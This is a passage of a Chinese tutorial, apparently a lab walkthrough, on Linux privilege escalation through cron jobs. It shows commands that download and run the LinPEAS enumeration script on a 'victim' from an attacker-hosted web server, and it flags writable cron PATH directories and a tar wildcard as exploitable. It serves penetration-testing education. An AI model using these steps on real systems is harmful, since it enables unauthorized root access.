<p>本质上，粘滞位只是使得标准用户只能编辑使用<strong>crontab -e</strong>命令创建属于自己的 cron 作业。</p>
<p>因此，我们必须想出另一种方式来看待它们——如果它们存在的话。</p>
<blockquote>
<p>有一种方法可以确定隐藏的 cron 作业是否正在运行，我们将在后面的文章中利用隐藏的 cron 作业时看到这一点。</p>
</blockquote>
<p>接下来，让我们看看 LinPEAS 如何帮我们找到 cron 任务。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3寻找-cron-任务--linpeas-方法"><strong><div id="id3">3、寻找 Cron 任务 – LinPEAS 方法</div></strong><a href="#3寻找-cron-任务--linpeas-方法" class="hash-link" aria-label="3寻找-cron-任务--linpeas-方法的直接链接" title="3寻找-cron-任务--linpeas-方法的直接链接">​</a></h2>
<p>LinPEAS 是一款绝佳的后渗透枚举工具，因为它提供了大量信息。在受害者上运行该工具后，我们将看到通过手动枚举发现的所有相同内容，甚至更多。</p>
<p>然而，在使用工具之前展示手动步骤非常重要，这样我们才能了解工具的输出以及要寻找的内容。</p>
<blockquote>
<p>如果您没有 LinPEAS 的副本，可以 <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">在这里</a> 获取一份。</p>
</blockquote>
<p>通常，当我们运行 LinPEAS 时，我们会不带参数运行“所有检查项”，然后从上到下逐行梳理所有输出。</p>
<blockquote>
<p>运行完整扫描时的一个好技巧是将 PEAS 的输出重定向到文件，以便使用 <strong>grep</strong> 可以快速解析常见漏洞和关键字。</p>
</blockquote>
<p>获取 LinPEAS 的副本后，我们需要将副本转移到受害者身上。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31将-linpeas-下载到受害者身上"><strong><div id="id3.1">3.1、将 LinPEAS 下载到受害者身上</div></strong><a href="#31将-linpeas-下载到受害者身上" class="hash-link" aria-label="31将-linpeas-下载到受害者身上的直接链接" title="31将-linpeas-下载到受害者身上的直接链接">​</a></h4>
<p>这可以通过多种方式完成，但在本例中，我们将从攻击者机器上启动的 Web 服务器下载它。</p>
<p>首先，我们需要从linpeas.sh所在的目录开启一个 HTTP 服务器。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server 80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113645729-1011495824-5fc5d69561efcffabb0d76be3ebd6f27.png" width="959" height="178" class="img_ev3q"></p>
<p>然后在受害机器上，我们可以先移动到 <strong>/tmp</strong> 目录，再下载 LinPEAS，然后授予其执行权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget http://172.16.1.30/linpeas.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 ./linpeas.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113628331-1390942023-1c1405b110d93ccd47fddced4cd6ec37.png" width="1024" height="256" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32用-linpeas-查找系统-cron-作业"><strong><div id="id3.2">3.2、用 LinPEAS 查找系统 Cron 作业</div></strong><a href="#32用-linpeas-查找系统-cron-作业" class="hash-link" aria-label="32用-linpeas-查找系统-cron-作业的直接链接" title="32用-linpeas-查找系统-cron-作业的直接链接">​</a></h4>
<p>我们的工具已准备就绪，我们只需使用命令 <strong>./linpeash.sh</strong>  ，脚本就会执行。</p>
<p>运行完成后，我们需要找到 &quot;<strong>Cron jobs</strong>&quot;子部分，它位于 &quot;<strong>Processes, Crons, Timers, Services and Sockets</strong>&quot;部分。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113548229-729256315-cab2de40ecfbb3d09b3276316afbe572.png" width="713" height="740" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113546978-80444940-e50900139cef7c072ee9617432d4f332.png" width="865" height="348" class="img_ev3q"></p>
<p>在这里我们可以看到，LinPEAS 列举了我们手动能找到的有关 cron 作业的所有相同信息（crontab + 4 个 cron 目录）。</p>
<blockquote>
<p><strong>anacron</strong> 是一个定期执行命令调度的计算机程序，传统上由 cron 完成，但不能假定系统可以持续运行。因此，它可用于控制每日、每周和每月工作的执行</p>
</blockquote>
<p>LinPEAS 还会检查我们当前用户在 cron PATH 中的权限，以及包含使用绝对路径运行的任何脚本的目录。</p>
<p>通过这项检查，我们可以在 /opt/scripts 和 /dev/shm 目录中看到红色/黄色标识，这意味着我们当前的用户在这些目录中具有写权限！</p>
<p>此外，我们可以看到运行 tar 命令的 cron 作业也出现了红色/黄色标识。这是因为命令是以通配符（*）结尾，并且是一个已知漏洞。</p>
<blockquote>
<p>LinPEAS 中的红色/黄色标识 = 该发现可被利用来提升权限的可能性为 95%。</p>
</blockquote>
<p>接下来，我们将逐一查看和利用我们发现的在受害者身上运行的每个 cron 作业。</p>
<p>在每个示例中，我们都假设刚刚在目标主机上站稳脚跟，然后进行了一些基本的手动枚举。由于手动枚举的结果并不理想，所以我们决定执行 LinPEAS 来帮助我们枚举主机；在每个示例中，我们都会发现一个不同的 cron 作业正在运行。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4利用-cron-jobs--cron-path"><strong><div id="id4">4、利用 Cron Jobs – Cron PATH</div></strong><a href="#4利用-cron-jobs--cron-path" class="hash-link" aria-label="4利用-cron-jobs--cron-path的直接链接" title="4利用-cron-jobs--cron-path的直接链接">​</a></h2>
<p>对于第一个例子，我们可以看到 crontab 在 cron PATH 中有一个红色/黄色标识。</p>
<p>此外，我们可以看到有一个 cron 作业以 root 身份每分钟运行！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113607725-1912539320-f30fe0f675b217746d42f2f09b1e07ed.png" width="869" height="169" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41确定如何利用-cron-job"><strong><div id="id4.1">4.1、确定如何利用 Cron Job</div></strong><a href="#41确定如何利用-cron-job" class="hash-link" aria-label="41确定如何利用-cron-job的直接链接" title="41确定如何利用-cron-job的直接链接">​</a></h4>
<p>之前我们了解到，没有执行二进制文件或脚本的绝对路径的 cron 作业将依赖 cron PATH 来查找它。在这种情况下，cron 作业将从左到右检查 cron PATH 中的每个目录，直到找到二进制文件或脚本。</p>
<p>有了这些信息，我们就可以使用 find 命令搜索 sytemctl 二进制文件，检查其执行位置。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -iname systemctl 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113546740-260005167-4fc0c9c612d03f05d859db5a3c665ec6.png" width="540" height="252" class="img_ev3q"></p>
<p>这告诉我们systemctl从/usr/bin目录执行。</p>
<p>查看 cron PATH，/usr/bin是列出的最后一个目录。这意味着我们当前的用户对 PATH 中较早的目录具有写权限。</p>
<p><strong>/dev/shm</strong> 上发现的红色/黄色标识表示我们对该目录具有写权限。为了确认这一点，我们可以发出以下命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -la /dev | grep &quot;shm&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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